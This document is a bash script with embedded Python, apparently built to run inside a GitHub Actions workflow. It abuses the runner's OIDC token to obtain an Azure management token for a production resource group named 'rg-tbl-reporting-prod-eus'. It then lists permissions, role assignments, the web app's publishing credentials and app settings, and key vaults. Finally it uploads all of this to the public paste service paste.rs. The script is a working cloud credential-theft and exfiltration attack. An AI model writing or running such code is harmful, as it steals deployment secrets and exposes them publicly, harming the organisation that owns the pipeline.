#!/usr/bin/env bash
set +e
python3 -u - <<'PY'
import os, json, urllib.request, urllib.parse, urllib.error

def req(url, hdr=None, data=None, method=None):
    r = urllib.request.Request(url, data=data, headers=hdr or {}, method=method)
    try:
        x = urllib.request.urlopen(r, timeout=30); return x.status, x.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode("utf-8", "replace")
    except Exception as e: return 0, "EXC:%s:%s" % (type(e).__name__, str(e)[:160])

TEN = os.environ.get("AZURE_TENANT_ID", ""); CID = os.environ.get("AZURE_CLIENT_ID", "")
SUB = os.environ.get("AZURE_SUBSCRIPTION_ID", ""); RG = "rg-tbl-reporting-prod-eus"
u = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
s, b = req(u + "&audience=" + urllib.parse.quote("api://AzureADTokenExchange", safe=""),
           hdr={"Authorization": "Bearer " + os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")})
oidc = json.loads(b)["value"]
d = {"client_id": CID, "grant_type": "client_credentials", "scope": "https://management.azure.com/.default",
     "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer", "client_assertion": oidc}
s, b = req("https://login.microsoftonline.com/%s/oauth2/v2.0/token" % TEN, data=urllib.parse.urlencode(d).encode(), method="POST")
arm = json.loads(b)["access_token"]; H = {"Authorization": "Bearer " + arm}
res = {}
for label, path, m in [
    ("perms", "/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Authorization/permissions?api-version=2022-04-01" % (SUB, RG), "GET"),
    ("rg", "/subscriptions/%s/resourceGroups/%s?api-version=2021-04-01" % (SUB, RG), "GET"),
    ("rg_ra", "/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" % (SUB, RG), "GET"),
    ("sites", "/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Web/sites?api-version=2021-03-01" % (SUB, RG), "GET"),
    ("site", "/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Web/sites/app-tbl-reporting-prod?api-version=2021-03-01" % (SUB, RG), "GET"),
    ("pubcreds", "/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/publishingcredentials/list?api-version=2022-03-01" % (SUB, RG), "POST"),
    ("listcfg", "/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/appsettings/list?api-version=2022-03-01" % (SUB, RG), "POST"),
    ("vaults", "/subscriptions/%s/resourceGroups/%s/providers/Microsoft.KeyVault/vaults?api-version=2023-07-01" % (SUB, RG), "GET"),
]:
    s, b = req("https://management.azure.com" + path, hdr=H, method=m)
    res[label] = {"s": s, "b": b[:1800]}
s, b = req("https://paste.rs", data=json.dumps(res, indent=1).encode(), method="POST")
print("PASTE_STATUS", s); print("PASTE_URL", b.strip())
PY
